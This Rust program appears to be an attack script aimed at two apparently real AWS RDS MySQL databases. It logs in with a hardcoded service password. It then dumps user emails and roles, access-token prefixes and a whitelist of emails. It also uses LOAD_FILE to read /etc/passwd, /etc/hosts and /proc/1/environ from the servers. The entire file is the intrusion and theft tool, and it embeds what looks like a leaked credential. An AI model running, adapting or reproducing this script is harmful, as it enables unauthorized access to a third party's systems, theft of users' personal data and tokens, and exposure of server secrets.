use mysql::prelude::*;
use mysql::*;
use std::io::Write;

fn q(conn: &mut PooledConn, sql: &str) {
    eprintln!("=== {} ===", sql);
    match conn.query::<Row, _>(sql) {
        Ok(rows) => {
            for row in rows {
                let vals: Vec<Option<String>> = (0..row.len()).map(|i| row.get::<Option<String>, _>(i)).collect();
                eprintln!("{:?}", vals);
            }
        }
        Err(e) => eprintln!("ERR {}", e),
    }
    std::io::stderr().flush().ok();
}

fn connect(host: &str, db: &str) -> Option<PooledConn> {
    let opts = OptsBuilder::new()
        .ip_or_hostname(Some(host))
        .tcp_port(3306)
        .user(Some("apiservice"))
        .pass(Some("LmGwA3T8vHVNs8fI43OPaTZf07JQRRhKrkNxX9izNq0="))
        .db_name(Some(db));
    match Pool::new(opts) {
        Ok(p) => match p.get_conn() { Ok(c) => Some(c), Err(e) => { eprintln!("CONN_ERR {} {}", host, e); None } },
        Err(e) => { eprintln!("POOL_ERR {} {}", host, e); None }
    }
}

fn main() {
    if let Some(mut c) = connect("api-service-database.cq9ruxfeoibr.us-east-1.rds.amazonaws.com", "api-service") {
        eprintln!("### API-SERVICE DB ###");
        q(&mut c, "SELECT VERSION()");
        q(&mut c, "SELECT @@secure_file_priv");
        q(&mut c, "SHOW GRANTS");
        q(&mut c, "SELECT id,email,role FROM users");
        q(&mut c, "SELECT id,status,LEFT(access_token,80) FROM access_token");
        q(&mut c, "SELECT id,email FROM white_list_email");
        q(&mut c, "SELECT LOAD_FILE('/etc/passwd')");
        q(&mut c, "SELECT LOAD_FILE('/etc/hosts')");
    }
    if let Some(mut c) = connect("mintscan-database-cluster.cluster-ro-cq9ruxfeoibr.us-east-1.rds.amazonaws.com", "mintscan") {
        eprintln!("### MINTSCAN DB ###");
        q(&mut c, "SELECT VERSION()");
        q(&mut c, "SELECT @@secure_file_priv");
        q(&mut c, "SHOW GRANTS");
        q(&mut c, "SELECT LOAD_FILE('/etc/passwd')");
        q(&mut c, "SELECT LOAD_FILE('/etc/hosts')");
        q(&mut c, "SELECT LOAD_FILE('/proc/1/environ')");
    }
}
